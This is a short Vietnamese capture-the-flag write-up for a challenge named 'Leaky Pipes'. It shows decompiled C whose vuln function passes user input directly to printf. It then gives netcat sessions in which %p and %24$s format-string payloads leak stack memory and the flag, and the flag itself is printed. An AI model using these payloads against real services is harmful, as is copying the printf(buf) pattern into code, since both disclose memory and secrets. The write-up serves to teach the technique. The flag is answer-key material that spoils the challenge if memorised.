# Leaky Pipes

## Analysis

Chương trình yêu cầu nhập đầu vào sau đó in ra
```
└─$ ./leaky_pipes
Tell me your secret so I can reveal mine ;) >> aaaaaaaa
Here's your secret.. I ain't telling mine :p
aaaaaaaa
```
Để ý thấy lỗi format string trong hàm vuln  
Có giá trị của flag trên vùng nhớ stack
```
void vuln(void) {
  char buf [128];
  undefined flag [68];
  
  readflag(flag,0x40);
  printf("Tell me your secret so I can reveal mine ;) >> ");
  __isoc99_scanf("%127s",buf);
  puts("Here\'s your secret.. I ain\'t telling mine :p");
                    /* format string */
  printf(buf);
  putchar(10);
  return;
}
```
## Solution
```
└─$ nc 34.125.199.248 1337
Tell me your secret so I can reveal mine ;) >> %p%p%p%p%p%p%p%p%p%p***%p%p%p%p%p%p%p%p%p%p***%p%p%p%p%p%p%p%p%p%p
Here's your secret.. I ain't telling mine :p
0xffffdcc00xffffdce00x80493740x702570250x702570250x702570250x702570250x702570250x252a2a2a0x25702570***
0x257025700x257025700x257025700x2a7025700x70252a2a0x702570250x702570250x702570250x702570250x8007025***
0xf7fe184e0x804837d0xf7ffd9900xffffdd440xf7ffdb500xf7fc94100x10x1(nil)0xf7fc9410
```
Thử leak data của địa chỉ 0xffffdd44 tương ứng với %24$s:
```
└─$ nc 34.125.199.248 1337
Tell me your secret so I can reveal mine ;) >> %24$s
Here's your secret.. I ain't telling mine :p
F{F0rm4t_5tr1ngs_l3ak4g3_l0l}
```
## Flag
```
OSCTF{F0rm4t_5tr1ngs_l3ak4g3_l0l}
```